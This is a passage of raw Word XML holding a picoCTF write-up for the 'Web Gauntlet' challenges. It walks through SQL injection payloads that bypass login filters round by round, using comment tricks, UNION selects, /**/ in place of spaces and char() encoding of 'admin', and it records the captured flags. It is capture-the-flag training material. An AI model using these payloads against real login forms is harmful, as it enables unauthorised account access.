        <w:t>// picoCTF{0n3_m0r3_t1m3_b55c7a5682db6cb0192b28772d4f4131}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2C31B8" w14:textId="067C2694" w:rsidR="00E54A70" w:rsidRDefault="00E54A70" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AEFF6D7" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Web Gauntlet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DD76FD"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 | 200 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452A9C6E"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Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBFFD9B" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>AUTHOR: MADSTACKS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7670EE62" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="657625F4" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>If the flag is not displayed after completing this challenge, try clearing your cookies. Cookies set by other challenges may prevent the flag from displaying properly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009AE154" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50C30544" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64ADF2EB" w14:textId="3C44A3E0" w:rsidR="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:19593/ </w:t>
      </w:r>
      <w:hyperlink r:id="rId130" w:history="1">
        <w:r w:rsidR="00903761" w:rsidRPr="00D5742F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:19593/filter.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="304FACC8" w14:textId="4F6BEB4D" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ound1 filter or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FF1FA3" w14:textId="77777777"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 xml:space="preserve">omment: -- </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1C9A2F" w14:textId="26617543" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>username: admi</w:t>
      </w:r>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>n'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1525D3D5" w14:textId="242767E1" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username='admin'--' AND password='ada'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C8E068" w14:textId="03DC5BD1" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Round2: or and like = --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BB178D" w14:textId="65144868"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omment/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562AAEB2" w14:textId="5A1BBA07" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>sername:</w:t>
      </w:r>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="AA759F"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="AA759F"/>
        </w:rPr>
        <w:t>admin'/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F05B675" w14:textId="74BC7E86" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SELECT * FROM users WHERE username='admin'/*' AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4ECEAA" w14:textId="305B56DB" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B1FD637" w14:textId="68380E40" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Round3: or and = like &gt; &lt; --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49878D75" w14:textId="704AA408" w:rsidR="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52C9B67C"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1 - filter: or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6A9D39" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Use basic injection and comment out the rest of the line.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581E55F1" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ED3EE4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4368A03D" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FD80F77"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ED610C3"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2 - filter: or and like = –</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354DDC16" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Without --, check for other ways to comment. We can also use UNION to get our specific user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07010A44" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DF3971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14F90728" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3094584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460B9853"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 union select * from users where username in("admin")/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DF7DA5" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29E40673"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 union select * from users where username in("admin")/* AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD825A6"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3 - filter: or and = like &gt; &lt; –</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2909CE" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>The first injection from the previous round still works here, but let’s try to get the second to work too. Spaces are now blocked, but we can use /**/ comments for the same effect. I tried %20 to replace all the spaces, but it was not effective.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2769D5AA" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2236AC9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26879118" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39D60BB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638BC4E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'/**/union/**/select*from/**/users/**/where/**/username/**/in("admin")/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040D4A21" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CE18BAA" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SELECT * FROM users WHERE username=''/**/union/**/select*from/**/users/**/where/**/username/**/in("admin")/*' AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B7AAA9"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4 - filter: or and = like &gt; &lt; – admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781AEE2E" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00242C83">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>In SQLITE, || is a concatenation operator</w:t>
      </w:r>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>. The simple solution is to simply split up “admin” in a way to bypass the filter. A more complicated solution could include encoding encode “admin” in ASCII number code and using the SQL CHAR() function to decode it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C306448" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2783E48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09E264F0" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D46FB8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72BD6D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'/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DEA2F2" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="231DDC6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username=''/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*' AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9D47FD"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5 - filter: or and = like &gt; &lt; – union admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDF9651" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Splitting up “admin” still works as only UNION is additionally blacklisted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B96805B" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57C728A8"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0E6F89C7" w14:textId="77777777" w:rsidR="007C7A2D" w:rsidRPr="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="007C7A2D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A83C1A3" w14:textId="68055B7A" w:rsid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79211BA7" w14:textId="062ED400" w:rsidR="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D87C111" w14:textId="6C068470" w:rsidR="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51139FAB" w14:textId="44B8BC8C" w:rsidR="007C7A2D" w:rsidRDefault="00930F85" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/filter.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A1BE66" w14:textId="33727FDD" w:rsidR="007C7A2D" w:rsidRDefault="00930F85" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00930F85">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E0C139" w14:textId="47080E1F" w:rsidR="00E54A70" w:rsidRDefault="00E54A70" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B129A33" w14:textId="33B24F53" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="552B0789" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA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Web Gauntlet 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECCFF7D"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49724DC1"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2021Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411DBBF5" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA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C06D7D" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FF9F89"/>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If the flag is not displayed after completing this challenge, try clearing your cookies. Cookies set by other challenges may prevent the flag from displaying properly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3512D3" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA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8200E42" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA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Last time, I promise! Only 25 characters this time. Log in as admin Site: </w:t>
      </w:r>
      <w:hyperlink r:id="rId131" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:63504/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> Filter: </w:t>
      </w:r>
      <w:hyperlink r:id="rId132" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:63504/filter.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1F55A87B" w14:textId="77777777" w:rsidR="00E46BA7" w:rsidRPr="00A35726" w:rsidRDefault="00E46BA7" w:rsidP="00E46BA7">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76B405" w14:textId="5AF3F6B8" w:rsidR="00E46BA7" w:rsidRDefault="00E46BA7" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Filters: or and true false union like = &gt; &lt; ; -- /* */ admin</w:t>
      </w:r>
    </w:p>
